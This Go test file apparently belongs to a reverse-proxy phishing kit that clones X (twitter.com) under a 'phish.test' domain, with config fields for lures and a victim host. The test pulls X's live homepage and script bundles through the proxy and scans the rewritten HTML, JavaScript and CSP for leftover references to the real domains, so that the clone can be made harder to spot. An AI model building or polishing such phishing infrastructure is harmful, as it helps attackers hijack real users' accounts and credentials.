package main

import (
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"testing"
)

// TestDiagLiveXProxy fetches the real X homepage through the proxy and dumps
// the rewritten HTML, JS bundle URLs, and CSP to /tmp/diag/ for manual
// inspection of any remaining real-host leaks. Set DIAG_LIVE=1 to run.
func TestDiagLiveXProxy(t *testing.T) {
	if os.Getenv("DIAG_LIVE") == "" {
		t.Skip("set DIAG_LIVE=1 to run live proxy diagnostic")
	}

	os.MkdirAll("/tmp/diag", 0o755)

	cfg := &config{
		listenAddr:  "127.0.0.1:8099",
		phishDomain: "phish.test",
		targetURL:   &url.URL{Scheme: "https", Host: "x.com"},
		origins:     []string{"x.com", "twitter.com", "twimg.com", "pscp.tv"},
		dataDir:     "/tmp/lures_test",
		insecure:    true,
	}
	store := newStore(cfg.dataDir)
	px := newProxy(cfg, store)

	srv := httptest.NewServer(http.HandlerFunc(px.ServeHTTP))
	defer srv.Close()

	u, _ := url.Parse(srv.URL)
	victimHost := u.Host
	client := srv.Client()

	// 1. Fetch the homepage through the proxy.
	req, _ := http.NewRequest("GET", srv.URL+"/", nil)
	req.Host = victimHost
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("homepage fetch: %v", err)
	}
	html, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	os.WriteFile("/tmp/diag/home.html", html, 0o644)

	csp := resp.Header.Get("Content-Security-Policy")
	os.WriteFile("/tmp/diag/csp_rewritten.txt", []byte(csp), 0o644)
	t.Logf("CSP (%d bytes): %s", len(csp), csp)

	// Leak scanner: any absolute URL referencing a real X/Twitter host.
	leakRe := regexp.MustCompile(`(https?://[^"'\s]+(?:x\.com|twitter\.com|twimg\.com|pscp\.tv)[^"'\s]*)`)

	htmlLeaks := leakRe.FindAllString(string(html), -1)
	os.WriteFile("/tmp/diag/html_leaks.txt", []byte(strings.Join(htmlLeaks, "\n")), 0o644)
	t.Logf("HTML real-host leaks: %d", len(htmlLeaks))
	for _, l := range htmlLeaks {
		t.Logf("  HTML LEAK: %s", l)
	}

	// 2. Extract <script src=...> URLs and fetch each through the proxy.
	scriptRe := regexp.MustCompile(`(?i)<script[^>]+src=["']([^"']+)["']`)
	matches := scriptRe.FindAllSubmatch(html, -1)
	t.Logf("Found %d script src URLs", len(matches))

	var sb strings.Builder
	for i, m := range matches {
		jsu := string(m[1])
		if strings.HasPrefix(jsu, "//") {
			jsu = "https:" + jsu
		}
		if !strings.HasPrefix(jsu, "http") {
			continue
		}
		ju, err := url.Parse(jsu)
		if err != nil {
			continue
		}
		proxyJS := srv.URL + ju.RequestURI()
		req2, _ := http.NewRequest("GET", proxyJS, nil)
		req2.Host = victimHost
		resp2, err := client.Do(req2)
		if err != nil {
			sb.WriteString("ERR " + jsu + " -> " + err.Error() + "\n")
			continue
		}
		body, _ := io.ReadAll(resp2.Body)
		resp2.Body.Close()
		os.WriteFile("/tmp/diag/js_"+strconv.Itoa(i)+".js", body, 0o644)
		jsLeaks := leakRe.FindAllString(string(body), -1)
		if len(jsLeaks) > 0 {
			sb.WriteString("JS " + jsu + " leaks " + strconv.Itoa(len(jsLeaks)) + ":\n")
			for _, l := range jsLeaks {
				sb.WriteString("   " + l + "\n")
			}
		}
	}
	os.WriteFile("/tmp/diag/js_leaks.txt", []byte(sb.String()), 0o644)
	t.Logf("JS leak summary -> /tmp/diag/js_leaks.txt")
}
